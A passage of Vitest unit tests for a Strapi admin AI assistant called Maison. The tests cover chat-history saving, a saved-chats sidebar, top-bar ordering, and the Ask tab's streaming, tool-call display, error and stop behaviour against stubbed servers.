    expect(started).toEqual(['create A', 'update B', 'update C']);
  });

  it('goes on with the next save when one fails, and tells what failed', async () => {
    const error = new Error('Strapi is down');
    const { queue, deps, log } = queueWith({
      create: vi.fn<SaveQueueDeps['create']>(async () => {
        throw error;
      }),
    });
    await queue.save(snapshot('One'));
    expect(deps.onError).toHaveBeenCalledExactlyOnceWith(error);
    expect(queue.openId()).toBeNull();
    // The chat was never created, so the next save creates it.
    deps.create.mockImplementation(async (shot) => {
      log.push(`create ${shot.title}`);
      return row('chat-1', shot.title);
    });
    await queue.save(snapshot('One', staff('u1')));
    expect(log).toEqual(['create One']);
    expect(queue.openId()).toBe('chat-1');
    expect(deps.onSaved).toHaveBeenCalledTimes(1);
  });

  it('does not stop later saves for a failed update, and keeps the chat it was saving', async () => {
    const { queue, deps, log } = queueWith();
    await queue.save(snapshot('One'));
    deps.update.mockRejectedValueOnce(new Error('Gateway timeout'));
    await queue.save(snapshot('One', staff('u1')));
    expect(deps.onError).toHaveBeenCalledOnce();
    expect(queue.openId()).toBe('chat-1');
    await queue.save(snapshot('One', staff('u1'), assistant('a1')));
    expect(log).toEqual(['create One', 'update chat-1 One']);
  });

  it('saves a chat again as a new chat when the chat is not there any more: deleted elsewhere, or cleared by Reset demo activity', async () => {
    const { queue, deps, log } = queueWith();
    await queue.save(snapshot('One'));
    deps.update.mockRejectedValueOnce(Object.assign(new Error('Not found'), { status: 404 }));
    await queue.save(snapshot('One', staff('u1')));
    expect(deps.onError).not.toHaveBeenCalled();
    expect(log).toEqual(['create One', 'create One']);
    expect(queue.openId()).toBe('chat-2');
    expect(deps.onSaved).toHaveBeenLastCalledWith(row('chat-2', 'One'), { created: true, current: true });
  });

  it('reports a 404 on the create it falls back to like any other failure', async () => {
    const { queue, deps } = queueWith();
    await queue.save(snapshot('One'));
    deps.update.mockRejectedValueOnce(Object.assign(new Error('Not found'), { status: 404 }));
    deps.create.mockRejectedValueOnce(new Error('Strapi is down'));
    await queue.save(snapshot('One', staff('u1')));
    expect(deps.onError).toHaveBeenCalledOnce();
    expect(queue.openId()).toBeNull();
  });

  describe('starting another chat', () => {
    it('does not give the new chat the ID of the chat that was being created: the create is for the chat it was made for', async () => {
      const gate = deferred<SavedChatRow>();
      const { queue, deps, log } = queueWith({ create: vi.fn<SaveQueueDeps['create']>(() => gate.promise) });
      const first = queue.save(snapshot('Old'));
      queue.switchTo(null);
      gate.resolve(row('chat-old', 'Old'));
      await first;
      expect(queue.openId()).toBeNull();
      expect(deps.onSaved).toHaveBeenCalledExactlyOnceWith(row('chat-old', 'Old'), { created: true, current: false });
      // The new chat is saved as a chat of its own.
      deps.create.mockImplementation(async (shot) => {
        log.push(`create ${shot.title}`);
        return row('chat-new', shot.title);
      });
      await queue.save(snapshot('New'));
      expect(log).toEqual(['create New']);
      expect(queue.openId()).toBe('chat-new');
    });

    it('sends a save that was made before the switch to the chat it was made for, even when it runs after it', async () => {
      const { queue, log } = queueWith();
      await queue.save(snapshot('Old'));
      const waiting = queue.save(snapshot('Old', staff('u1')));
      queue.switchTo(null);
      const next = queue.save(snapshot('New'));
      await Promise.all([waiting, next]);
      expect(log).toEqual(['create Old', 'update chat-1 Old', 'create New']);
      expect(queue.openId()).toBe('chat-2');
    });

    it('tells that an update is not for the open chat when staff moved on before it ran', async () => {
      const { queue, deps } = queueWith();
      await queue.save(snapshot('Old'));
      const waiting = queue.save(snapshot('Old', staff('u1')));
      queue.switchTo(null);
      await waiting;
      expect(deps.onSaved).toHaveBeenLastCalledWith(row('chat-1', 'Old'), { created: false, current: false });
    });

    it('updates a saved chat that is opened, from the next save on', async () => {
      const { queue, log } = queueWith();
      queue.switchTo('chat-77');
      expect(queue.openId()).toBe('chat-77');
      await queue.save(snapshot('Older', staff('u1')));
      expect(log).toEqual(['update chat-77 Older']);
    });

    it('is a new chat again after a saved one: New chat keeps the old chat and starts an empty one', async () => {
      const { queue, log } = queueWith();
      await queue.save(snapshot('One'));
      queue.switchTo(null);
      expect(queue.openId()).toBeNull();
      await queue.save(snapshot('Two'));
      expect(log).toEqual(['create One', 'create Two']);
      queue.switchTo('chat-1');
      await queue.save(snapshot('One', staff('u1')));
      expect(log.at(-1)).toBe('update chat-1 One');
    });
  });

  describe('forget', () => {
    it('makes the open chat a new one when it is the chat that was deleted: the next save creates a chat', async () => {
      const { queue, log } = queueWith();
      await queue.save(snapshot('One'));
      queue.forget('chat-1');
      expect(queue.openId()).toBeNull();
      await queue.save(snapshot('One', staff('u1')));
      expect(log).toEqual(['create One', 'create One']);
    });

    it('leaves the open chat alone when another chat was deleted', async () => {
      const { queue } = queueWith();
      queue.switchTo('chat-5');
      queue.forget('chat-9');
      expect(queue.openId()).toBe('chat-5');
    });
  });

  it('is idle when every save so far is over: a delete waits for the saves before it', async () => {
    const gate = deferred<SavedChatRow>();
    const { queue } = queueWith({ create: vi.fn<SaveQueueDeps['create']>(() => gate.promise) });
    void queue.save(snapshot('One'));
    let idle = false;
    const waiting = queue.idle().then(() => {
      idle = true;
    });
    await Promise.resolve();
    expect(idle).toBe(false);
    gate.resolve(row('chat-1'));
    await waiting;
    expect(idle).toBe(true);
  });

  it('is idle at once when nothing was saved', async () => {
    await expect(queueWith().queue.idle()).resolves.toBeUndefined();
  });

  it('gives staff one text for each thing that can fail', () => {
    expect(HISTORY_ERRORS).toEqual({
      list: "Couldn't load your saved chats.",
      open: "Couldn't open that chat.",
      save: "Couldn't save this chat.",
      remove: "Couldn't delete that chat.",
    });
    for (const text of Object.values(HISTORY_ERRORS)) expect(text).not.toMatch(/\u2014|\u2013/);
  });
});
```

Create `test/unit/conversation-sidebar.test.tsx`:

```tsx
// @vitest-environment jsdom
import { screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { ConversationSidebar } from '../../admin/src/components/assistant/ConversationSidebar';
import { renderInTheme } from './render';

const CHATS = [
  { documentId: 'c3', title: 'Any complaints this week?', updatedAt: '2026-10-07T03:00:00.000Z' },
  { documentId: 'c2', title: 'Which visits are waiting for staff?', updatedAt: '2026-10-07T02:00:00.000Z' },
  { documentId: 'c1', title: '今日のお客様からの問い合わせは?', updatedAt: '2026-10-07T01:00:00.000Z' },
];

const sidebar = (props: Partial<Parameters<typeof ConversationSidebar>[0]> = {}) => (
  <ConversationSidebar chats={CHATS} openId="c2" open busy={false} onSelect={() => {}} onNew={() => {}} onDelete={() => {}} {...props} />
);
const root = () => screen.getByLabelText('Saved chats');

/** The rules styled-components wrote for an element: every rule in the document that starts with one of its classes. */
const cssOf = (element: Element): string => {
  const all = Array.from(document.querySelectorAll('style'))
    .map((style) => style.textContent ?? '')
    .join('\n');
  const classes = Array.from(element.classList);
  return all
    .split('}')
    .filter((rule) => classes.some((name) => rule.trimStart().startsWith(`.${name}`)))
    .map((rule) => `${rule}}`)
    .join('\n');
};

describe('ConversationSidebar', () => {
  it('lists the chats in the order it is given, newest first, each as a button with its title', () => {
    renderInTheme(sidebar());
    const titles = within(root())
      .getAllByRole('button')
      .map((button) => button.textContent)
      .filter((text) => text && !text.startsWith('New chat'));
    expect(titles).toEqual(['Any complaints this week?', 'Which visits are waiting for staff?', '今日のお客様からの問い合わせは?']);
  });

  it('opens a chat when its row is pressed', async () => {
    const onSelect = vi.fn();
    renderInTheme(sidebar({ onSelect }));
    await userEvent.click(screen.getByRole('button', { name: 'Any complaints this week?' }));
    expect(onSelect).toHaveBeenCalledExactlyOnceWith('c3');
  });

  it("marks the open chat's row, for a screen reader, and no other", () => {
    renderInTheme(sidebar());
    expect(screen.getByRole('button', { name: 'Which visits are waiting for staff?' }).getAttribute('aria-current')).toBe('true');
    expect(screen.getByRole('button', { name: 'Any complaints this week?' }).hasAttribute('aria-current')).toBe(false);
  });

  it('marks no row for a chat that is not saved yet', () => {
    renderInTheme(sidebar({ openId: null }));
    for (const button of within(root()).getAllByRole('button')) expect(button.hasAttribute('aria-current')).toBe(false);
  });

  it('starts a new chat with the button at its top', async () => {
    const onNew = vi.fn();
    renderInTheme(sidebar({ onNew }));
    await userEvent.click(within(root()).getByRole('button', { name: 'New chat' }));
    expect(onNew).toHaveBeenCalledOnce();
  });

  it('deletes a chat with its own trash button, named for the chat, and opens nothing', async () => {
    const onDelete = vi.fn();
    const onSelect = vi.fn();
    renderInTheme(sidebar({ onDelete, onSelect }));
    await userEvent.click(screen.getByRole('button', { name: 'Delete chat: Which visits are waiting for staff?' }));
    expect(onDelete).toHaveBeenCalledExactlyOnceWith('c2');
    expect(onSelect).not.toHaveBeenCalled();
  });

  it('keeps the row and its trash button apart, as siblings: neither is inside the other', () => {
    renderInTheme(sidebar());
    const select = screen.getByRole('button', { name: 'Which visits are waiting for staff?' });
    const trash = screen.getByRole('button', { name: 'Delete chat: Which visits are waiting for staff?' });
    expect(select.contains(trash)).toBe(false);
    expect(trash.contains(select)).toBe(false);
    expect(select.parentElement).toBe(trash.parentElement);
  });

  it('says there are no saved chats when the list is empty', () => {
    renderInTheme(sidebar({ chats: [], openId: null }));
    expect(screen.getByText('No saved chats yet.')).toBeTruthy();
    expect(screen.queryByText('No saved chats yet.')?.closest('button')).toBeNull();
  });

  it('shows no empty text when there are chats', () => {
    renderInTheme(sidebar());
    expect(screen.queryByText('No saved chats yet.')).toBeNull();
  });

  describe('while an answer comes', () => {
    it('switches off every row, every trash button and New chat, and does nothing when they are pressed', async () => {
      const onSelect = vi.fn();
      const onNew = vi.fn();
      const onDelete = vi.fn();
      renderInTheme(sidebar({ busy: true, onSelect, onNew, onDelete }));
      const buttons = within(root()).getAllByRole('button') as HTMLButtonElement[];
      expect(buttons).toHaveLength(1 + CHATS.length * 2);
      for (const button of buttons) {
        expect(button.disabled, button.getAttribute('aria-label') ?? button.textContent ?? '').toBe(true);
        await userEvent.click(button);
      }
      expect(onSelect).not.toHaveBeenCalled();
      expect(onNew).not.toHaveBeenCalled();
      expect(onDelete).not.toHaveBeenCalled();
    });

    it('switches them on again when the answer is over', () => {
      renderInTheme(sidebar({ busy: false }));
      for (const button of within(root()).getAllByRole('button') as HTMLButtonElement[]) expect(button.disabled).toBe(false);
    });
  });

  describe('closed', () => {
    it('is hidden from screen readers and inert, so its buttons leave the tab order', () => {
      renderInTheme(sidebar({ open: false }));
      const closed = document.querySelector('[aria-label="Saved chats"]') as HTMLElement;
      expect(closed.getAttribute('aria-hidden')).toBe('true');
      expect(closed.hasAttribute('inert')).toBe(true);
    });

    it('is not hidden and not inert when it is open', () => {
      renderInTheme(sidebar({ open: true }));
      expect(root().getAttribute('aria-hidden')).toBe('false');
      expect(root().hasAttribute('inert')).toBe(false);
    });

    it('is 260px wide when open and has no width at all when closed, so opening it changes its width and nothing around it', () => {
      const open = renderInTheme(sidebar({ open: true }));
      expect(cssOf(root())).toMatch(/[{;]width:260px;/);
      expect(cssOf(root())).toContain('min-width:260px');
      open.unmount();
      renderInTheme(sidebar({ open: false }));
      const closed = document.querySelector('[aria-label="Saved chats"]') as HTMLElement;
      expect(cssOf(closed)).toMatch(/[{;]width:0px;/);
      expect(cssOf(closed)).toContain('min-width:0px');
      expect(cssOf(closed)).toContain('overflow:hidden');
    });

    it('keeps its rows in the document, so opening it is a change of width and not a new list', () => {
      renderInTheme(sidebar({ open: false }));
      expect(document.querySelectorAll('[aria-label="Saved chats"] button').length).toBeGreaterThan(0);
    });
  });

  it('has no "Manage history" link: Maison has no page for it', () => {
    renderInTheme(sidebar());
    expect(screen.queryByText(/manage history/i)).toBeNull();
    expect(within(root()).queryByRole('link')).toBeNull();
  });

  it('draws in the dark theme too', () => {
    renderInTheme(sidebar(), { dark: true });
    expect(screen.getByRole('button', { name: 'Any complaints this week?' })).toBeTruthy();
  });
});
```

`test/unit/chat-area.test.tsx`: the area takes a sidebar and the History button, which comes first in the top bar.

```diff
@@
 ];
 
 const area = (props: Partial<Parameters<typeof ChatArea>[0]> = {}) => (
-  <ChatArea model="claude-sonnet-5-5" tools={TOOLS} canStartOver newChatOffered={false} onNewChat={() => {}} {...props}>
+  <ChatArea
+    model="claude-sonnet-5-5"
+    tools={TOOLS}
+    canStartOver
+    newChatOffered={false}
+    onNewChat={() => {}}
+    sidebar={<nav aria-label="The sidebar">The saved chats</nav>}
+    historyOpen={false}
+    onToggleHistory={() => {}}
+    {...props}
+  >
     <p>The messages and the composer</p>
   </ChatArea>
 );
 
 describe('ChatArea', () => {
-  it('has the tools, the model and New chat in the top bar, in that order, and what it is given under it', () => {
+  it('has the sidebar, then History, the tools, the model and New chat in the top bar, in that order, and what it is given under it', () => {
     renderInTheme(area());
+    const sidebar = screen.getByRole('navigation', { name: 'The sidebar' });
+    const history = screen.getByRole('button', { name: 'History' });
     const tools = screen.getByRole('button', { name: 'Tools (2)' });
     const model = screen.getByText('claude-sonnet-5-5');
     const newChat = screen.getByRole('button', { name: 'New chat' });
     const body = screen.getByText('The messages and the composer');
     const before = (a: Node, b: Node) => Boolean(a.compareDocumentPosition(b) & Node.DOCUMENT_POSITION_FOLLOWING);
+    expect(before(sidebar, history)).toBe(true);
+    expect(before(history, tools)).toBe(true);
     expect(before(tools, model)).toBe(true);
     expect(before(model, newChat)).toBe(true);
     expect(before(newChat, body)).toBe(true);
+  });
+
+  it('opens and closes the sidebar with History, which says what it will do and whether the sidebar is open', async () => {
+    const onToggleHistory = vi.fn();
+    const view = renderInTheme(area({ onToggleHistory }));
+    const closed = screen.getByRole('button', { name: 'History' });
+    expect(closed.getAttribute('aria-expanded')).toBe('false');
+    await userEvent.click(closed);
+    expect(onToggleHistory).toHaveBeenCalledOnce();
+
+    view.unmount();
+    renderInTheme(area({ historyOpen: true }));
+    const opened = screen.getByRole('button', { name: 'Hide history' });
+    expect(opened.getAttribute('aria-expanded')).toBe('true');
+    expect(screen.queryByRole('button', { name: 'History' })).toBeNull();
   });
 
   it('names the model as the status gave it: the ID as it is, which the badge draws in capitals', () => {
```

Replace `test/unit/ask-tab.test.tsx` with this file:

```tsx
// @vitest-environment jsdom
import { screen, waitFor, within } from '@testing-library/react';
import type { ReactElement } from 'react';
import userEvent from '@testing-library/user-event';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { AskTab } from '../../admin/src/components/assistant/AskTab';
import { AssistantProvider, useAssistant } from '../../admin/src/components/assistant/AssistantProvider';
import { renderInTheme } from './render';

/*
 * The Ask tab as staff meet it: the real provider, with `useChat` and the real connection adapter, over a stand-in for Strapi's fetch client
 * (the status call) and for `fetch` (the chat stream). Nothing here reaches a server or a model.
 */
const client = vi.hoisted(() => ({ get: vi.fn(), post: vi.fn(), put: vi.fn(), del: vi.fn() }));
vi.mock('@strapi/strapi/admin', () => ({ useFetchClient: () => client }));

const TOOLS = [
  { name: 'list_requests', label: 'Visit requests' },
  { name: 'inquiry_counts', label: 'Inquiry counts' },
];
const READY = { ready: true, model: 'claude-sonnet-5-5', tools: TOOLS };
const NOT_SET_UP = { ready: false, reason: 'The assistant works with Anthropic only. AI_PROVIDER is set to openai.' };

const encoder = new TextEncoder();
const event = (type: string, extra: Record<string, unknown> = {}) => ({ type, timestamp: Date.now(), threadId: 't', runId: 'r', ...extra });
/** A server-sent event stream of AG-UI events, as the server's chat route answers one. It ends after the last event. */
const stream = (events: Array<Record<string, unknown>>) =>
  new Response(
    new ReadableStream({
      start(controller) {
        for (const item of events) controller.enqueue(encoder.encode(`data: ${JSON.stringify(item)}\n\n`));
        controller.close();
      },
    }),
    { status: 200, headers: { 'Content-Type': 'text/event-stream' } }
  );
/** An answer in one text message. Each has a message ID of its own: a message with an ID the chat already has is added to that message. */
let answers = 0;
const answer = (text: string) => {
  answers += 1;
  const messageId = `answer-${answers}`;
  return [
    event('RUN_STARTED'),
    event('TEXT_MESSAGE_START', { messageId, role: 'assistant' }),
    event('TEXT_MESSAGE_CONTENT', { messageId, delta: text }),
    event('TEXT_MESSAGE_END', { messageId }),
    event('RUN_FINISHED', { finishReason: 'stop' }),
  ];
};

/** A chat as the server holds it: its row, and its messages. */
interface SavedChat {
  documentId: string;
  title: string;
  updatedAt: string;
  messages: unknown[];
}
const staffSays = (id: string, content: string) => ({ id, role: 'user', parts: [{ type: 'text', content }] });
const assistantSays = (id: string, content: string) => ({ id, role: 'assistant', parts: [{ type: 'text', content }] });
const savedChat = (documentId: string, title: string, messages: unknown[] = [staffSays(`${documentId}-u`, title), assistantSays(`${documentId}-a`, `The answer to ${title}`)], updatedAt = '2026-10-06T00:00:00.000Z'): SavedChat => ({
  documentId,
  title,
  updatedAt,
  messages,
});
/** The 404 Strapi's fetch client throws for a chat that is not there. */
const notFound = () => Object.assign(new Error('There is no saved chat with that ID.'), { status: 404 });

/**
 * The page over stand-ins: Strapi's fetch client, which answers the status and holds the admin's saved chats (newest first, as the server
 * lists them), and `fetch`, which answers each chat request with the next stream scripted for it. `server.rows` is what is saved.
 */
const world = ({ status = READY as unknown, chat = [] as Array<() => Response | Promise<Response>>, saved = [] as SavedChat[], mount = true } = {}) => {
  const rows: SavedChat[] = [...saved];
  let created = 0;
  let clock = Date.parse('2026-10-07T00:00:00.000Z');
  const row = ({ messages: _messages, ...summary }: SavedChat) => summary;
  const idOf = (url: string) => decodeURIComponent(url.split('/').at(-1) as string);

  for (const method of [client.get, client.post, client.put, client.del]) method.mockReset();
  client.get.mockImplementation(async (url: string) => {
    if (url === '/maison/assistant/status') {
      if (status instanceof Error) throw status;
      return { data: status };
    }
    if (url === '/maison/conversations') return { data: { conversations: rows.map(row) } };
    if (url.startsWith('/maison/conversations/')) {
      const found = rows.find((chatRow) => chatRow.documentId === idOf(url));
      if (!found) throw notFound();
      return { data: { conversation: found } };
    }
    throw new Error(`Unexpected GET ${url}`);
  });
  client.post.mockImplementation(async (url: string, body: { title: string; messages: unknown[] }) => {
    if (url !== '/maison/conversations') throw new Error(`Unexpected POST ${url}`);
    created += 1;
    clock += 1000;
    const made = { documentId: `saved-${created}`, title: body.title, messages: body.messages, updatedAt: new Date(clock).toISOString() };
    rows.unshift(made);
    return { data: { conversation: row(made) } };
  });
  client.put.mockImplementation(async (url: string, body: { title?: string; messages?: unknown[] }) => {
    const index = rows.findIndex((chatRow) => chatRow.documentId === idOf(url));
    if (index < 0) throw notFound();
    clock += 1000;
    const [found] = rows.splice(index, 1);
    const changed = { ...found, ...body, updatedAt: new Date(clock).toISOString() };
    rows.unshift(changed as SavedChat);
    return { data: { conversation: row(changed as SavedChat) } };
  });
  client.del.mockImplementation(async (url: string) => {
    const index = rows.findIndex((chatRow) => chatRow.documentId === idOf(url));
    if (index < 0) throw notFound();
    rows.splice(index, 1);
    return { data: { documentId: idOf(url) } };
  });

  const answers = [...chat];
  const fetchMock = vi.fn(async () => {
    const next = answers.shift();
    if (!next) throw new Error('No answer was scripted for this request.');
    return next();
  });
  vi.stubGlobal('fetch', fetchMock);
  /** Puts the Ask tab, or another tree, inside the provider. A test that changes the stand-ins first passes `mount: false` and calls this itself. */
  const show = (ui: ReactElement = <AskTab />) =>
    renderInTheme(
      <AssistantProvider>
        {ui}
      </AssistantProvider>
    );
  if (mount) show();
  return { fetchMock, rows, show };
};

const box = () => screen.getByRole('textbox', { name: 'Chat message' }) as HTMLTextAreaElement;
const region = () => screen.getByRole('region', { name: 'Chat messages' });
/** Waits until the chat is on the screen and shows `text` in its messages. */
const shows = async (text: string) => within(await screen.findByRole('region', { name: 'Chat messages' })).findByText(text);
/** The body of the request the page sent to the chat route. */
const sentBody = (fetchMock: ReturnType<typeof vi.fn>, index = 0) => JSON.parse((fetchMock.mock.calls[index] as unknown as [string, { body: string }])[1].body);

beforeEach(() => {
  localStorage.clear();
});
afterEach(() => {
  vi.unstubAllGlobals();
});

describe('before the chat', () => {
  it('shows "Checking the assistant…" with a loader, and no text box, until the status answers', async () => {
    let answerStatus: (value: unknown) => void = () => {};
    client.get.mockReset();
    client.get.mockImplementation(() => new Promise((resolve) => (answerStatus = resolve)));
    renderInTheme(
      <AssistantProvider>
        <AskTab />
      </AssistantProvider>
    );
    expect(screen.getByText('Checking the assistant…')).toBeTruthy();
    expect(screen.queryByRole('textbox')).toBeNull();
    answerStatus({ data: READY });
    expect(await screen.findByRole('textbox', { name: 'Chat message' })).toBeTruthy();
    expect(screen.queryByText('Checking the assistant…')).toBeNull();
  });

  it('shows the reason and Check again, and no text box, when the assistant is not set up', async () => {
    world({ status: NOT_SET_UP });
    expect(await screen.findByRole('heading', { name: "The assistant isn't set up" })).toBeTruthy();
    expect(screen.getByText(NOT_SET_UP.reason)).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Check again' })).toBeTruthy();
    expect(screen.queryByRole('textbox')).toBeNull();
  });

  it('asks again when Check again is pressed, and shows the chat once the assistant is ready', async () => {
    world({ status: NOT_SET_UP });
    await screen.findByRole('button', { name: 'Check again' });
    client.get.mockImplementation(async () => ({ data: READY }));
    await userEvent.click(screen.getByRole('button', { name: 'Check again' }));
    expect(await screen.findByRole('textbox', { name: 'Chat message' })).toBeTruthy();
  });

  it("says the assistant could not be checked, in the server's words, when the status call fails, with Check again", async () => {
    world({ status: new Error('Forbidden') });
    expect(await screen.findByText("Couldn't check the assistant: Forbidden")).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Check again' })).toBeTruthy();
    expect(screen.queryByRole('textbox')).toBeNull();
  });

  it('says so, with no chat, for an admin who has no assistant at all', () => {
    renderInTheme(<AskTab />);
    expect(screen.getByText('The assistant is not available for your role.')).toBeTruthy();
  });
});

describe('the chat area', () => {
  it('has the tools, the model and New chat in the top bar, the starters in the empty state, and the composer', async () => {
    world();
    expect(await screen.findByRole('button', { name: 'Tools (2)' })).toBeTruthy();
    expect(screen.getByText('claude-sonnet-5-5')).toBeTruthy();
    expect((screen.getByRole('button', { name: 'New chat' }) as HTMLButtonElement).disabled).toBe(true);
    expect(screen.getByText('Ask Maison')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Which visits are waiting for staff?' })).toBeTruthy();
    expect((screen.getByRole('button', { name: 'Send' }) as HTMLButtonElement).disabled).toBe(true);
  });
});

describe('a turn', () => {
  it('sends what staff typed with Enter, draws the answer as Markdown, and brings Send back', async () => {
    const table = ['| Reference | Status |', '| --- | --- |', '| APT-4821 | requested |'].join('\n');
    const { fetchMock } = world({ chat: [() => stream(answer(table))] });
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');

    // The question is in the chat at once, and the box is empty again.
    expect(await within(region()).findByText('Which visits are waiting?')).toBeTruthy();
    expect(box().value).toBe('');
    // The answer comes as a table.
    expect(await within(region()).findByRole('table')).toBeTruthy();
    expect(within(region()).getByRole('cell', { name: 'APT-4821' })).toBeTruthy();
    // The turn is over: Stop has gone, and Send waits only for the next question.
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull());
    expect((screen.getByRole('button', { name: 'Send' }) as HTMLButtonElement).disabled).toBe(true);
    // The request carried the question, to the assistant's chat route.
    expect(fetchMock).toHaveBeenCalledOnce();
    expect((fetchMock.mock.calls[0] as unknown as [string])[0]).toBe('/maison/assistant/chat');
    expect(sentBody(fetchMock).messages.at(-1)).toMatchObject({ role: 'user', content: 'Which visits are waiting?' });
    // The empty state has gone, and New chat works.
    expect(screen.queryByText('Ask Maison')).toBeNull();
    expect((screen.getByRole('button', { name: 'New chat' }) as HTMLButtonElement).disabled).toBe(false);
  });

  it('sends a starter as it is written, and leaves what staff typed in the box', async () => {
    const { fetchMock } = world({ chat: [() => stream(answer('Two visits wait.'))] });
    await screen.findByRole('textbox', { name: 'Chat message' });
    await userEvent.type(box(), 'A half-written question');

    await userEvent.click(screen.getByRole('button', { name: 'Which visits are waiting for staff?' }));

    expect(await within(region()).findByText('Two visits wait.')).toBeTruthy();
    expect(sentBody(fetchMock).messages.at(-1)).toMatchObject({ role: 'user', content: 'Which visits are waiting for staff?' });
    expect(box().value).toBe('A half-written question');
  });

  it('puts the focus back in the text box after a send, from a starter and from the Send button alike, so the next question can be typed', async () => {
    world({ chat: [() => stream(answer('One.')), () => stream(answer('Two.'))] });
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.click(screen.getByRole('button', { name: 'Which visits are waiting for staff?' }));
    await within(region()).findByText('One.');
    expect(document.activeElement).toBe(box());

    await userEvent.type(box(), 'And the questions?');
    await userEvent.click(screen.getByRole('button', { name: 'Send' }));
    await within(region()).findByText('Two.');
    expect(document.activeElement).toBe(box());
  });

  // Radix unmounts the content of a tab that is not open, so the page keeps the chat in the provider, above the tabs.
  it('keeps the chat and what staff typed while they look at another tab, and shows both when they come back', async () => {
    const { show } = world({ chat: [() => stream(answer('Two visits wait.'))], mount: false });
    const view = show();
    await screen.findByRole('textbox', { name: 'Chat message' });
    await userEvent.type(box(), 'Which visits are waiting?{Enter}');
    await within(region()).findByText('Two visits wait.');
    await userEvent.type(box(), 'And the questions');

    view.rerender(
      <AssistantProvider>
        <p>Another tab</p>
      </AssistantProvider>
    );
    expect(screen.queryByRole('textbox')).toBeNull();
    view.rerender(
      <AssistantProvider>
        <AskTab />
      </AssistantProvider>
    );

    expect(box().value).toBe('And the questions');
    expect(within(region()).getByText('Two visits wait.')).toBeTruthy();
  });

  it('shows a tool box for a tool call, in the order it came, closed, and opens it to the result', async () => {
    const calls = [
      event('RUN_STARTED'),
      event('TEXT_MESSAGE_START', { messageId: 'm1', role: 'assistant' }),
      event('TEXT_MESSAGE_CONTENT', { messageId: 'm1', delta: 'Let me look. ' }),
      event('TEXT_MESSAGE_END', { messageId: 'm1' }),
      event('TOOL_CALL_START', { toolCallId: 'c1', toolCallName: 'list_requests', parentMessageId: 'm1' }),
      event('TOOL_CALL_ARGS', { toolCallId: 'c1', delta: '{}' }),
      event('TOOL_CALL_END', { toolCallId: 'c1', toolCallName: 'list_requests', input: {} }),
      event('TOOL_CALL_RESULT', { toolCallId: 'c1', messageId: 'r1', content: JSON.stringify({ requests: [{ reference: 'APT-4821', note: '<customer_note>For my father.</customer_note>' }], capped: false }) }),
      event('TEXT_MESSAGE_START', { messageId: 'm2', role: 'assistant' }),
      event('TEXT_MESSAGE_CONTENT', { messageId: 'm2', delta: 'One visit waits.' }),
      event('TEXT_MESSAGE_END', { messageId: 'm2' }),
      event('RUN_FINISHED', { finishReason: 'stop' }),
    ];
    world({ chat: [() => stream(calls)] });
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');

    const header = await within(region()).findByRole('button', { name: /Tool: list_requests/ });
    expect(header.getAttribute('aria-expanded')).toBe('false');
    await waitFor(() => expect(header.textContent).toContain('1 result'));
    await userEvent.click(header);
    const body = region().querySelector('pre') as HTMLElement;
    expect(body.textContent).toContain('"reference": "APT-4821"');
    expect(body.textContent).toContain('For my father.');
    expect(body.textContent).not.toContain('customer_note');
  });

  it('shows the error in a red alert, takes the failed question back into the box, and clears the error on the next send', async () => {
    const failed = [event('RUN_STARTED'), event('RUN_ERROR', { message: 'Anthropic is busy. Try again in a minute.', code: '529' })];
    world({ chat: [() => stream(failed), () => stream(answer('Fine.'))] });
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');

    const alert = (await screen.findByText('Anthropic is busy. Try again in a minute.')).closest('[role="alert"]');
    expect(alert).not.toBeNull();
    // The turn that failed before anything came back leaves the chat, and its question goes back in the box.
    await waitFor(() => expect(box().value).toBe('Which visits are waiting?'));
    expect(within(region()).queryByText('Which visits are waiting?')).toBeNull();
    expect(screen.getByText('Ask Maison')).toBeTruthy();

    await userEvent.type(box(), '{Enter}');
    expect(await within(region()).findByText('Fine.')).toBeTruthy();
    expect(screen.queryByText('Anthropic is busy. Try again in a minute.')).toBeNull();
  });

  it('shows the words "New chat" on the button when the chat is too long to go on, and starts over when it is pressed', async () => {
    const tooLong = [event('RUN_STARTED'), event('RUN_ERROR', { message: 'This chat is long. Start a new chat.', code: 'chat_too_long' })];
    world({ chat: [() => stream(answer('Hello.')), () => stream(tooLong)] });
    await screen.findByRole('textbox', { name: 'Chat message' });
    await userEvent.type(box(), 'First{Enter}');
    await within(region()).findByText('Hello.');
    await userEvent.type(box(), 'Second{Enter}');

    await screen.findByText('This chat is long. Start a new chat.');
    const newChat = screen.getByRole('button', { name: 'New chat' });
    expect(newChat.textContent).toBe('New chat');

    await userEvent.click(newChat);
    expect(screen.queryByText('This chat is long. Start a new chat.')).toBeNull();
    expect(screen.getByText('Ask Maison')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'New chat' }).textContent).toBe('');
  });

  it('stops an answer that is on its way with Stop, keeps what came, and shows no error', async () => {
    let started: () => void = () => {};
    const began = new Promise<void>((resolve) => (started = resolve));
    const slow = (signal?: AbortSignal) =>
      new Response(
        new ReadableStream({
          start(controller) {
            for (const item of answer('Looking into it').slice(0, 3)) controller.enqueue(encoder.encode(`data: ${JSON.stringify(item)}\n\n`));
            started();
            signal?.addEventListener('abort', () => controller.error(new DOMException('The operation was aborted.', 'AbortError')));
          },
        }),
        { status: 200, headers: { 'Content-Type': 'text/event-stream' } }
      );
    world();
    vi.stubGlobal('fetch', vi.fn(async (_url: string, init?: { signal?: AbortSignal }) => slow(init?.signal)));
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');
    await began;
    expect(await within(region()).findByText('Looking into it')).toBeTruthy();
    await userEvent.click(await screen.findByRole('button', { name: 'Stop' }));

    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull());
    expect(within(region()).getByText('Looking into it')).toBeTruthy();
    // The design system's own live region is an empty alert, so what is looked for is an alert with words in it.
